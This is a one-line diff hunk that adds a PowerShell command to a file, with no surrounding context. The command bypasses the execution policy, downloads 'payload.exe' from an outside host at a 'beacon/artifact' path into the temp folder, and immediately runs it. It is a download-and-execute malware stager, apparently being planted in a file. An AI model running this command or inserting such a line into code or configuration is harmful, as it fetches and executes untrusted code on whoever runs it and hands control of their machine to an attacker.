@@ -1,0 +1,1 @@
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='http://admin.yuxiit.cn/api/beacon/artifact/6b00d6fa';$f=Join-Path $env:TEMP 'payload.exe';(New-Object Net.WebClient).DownloadFile($u,$f);Start-Process $f"
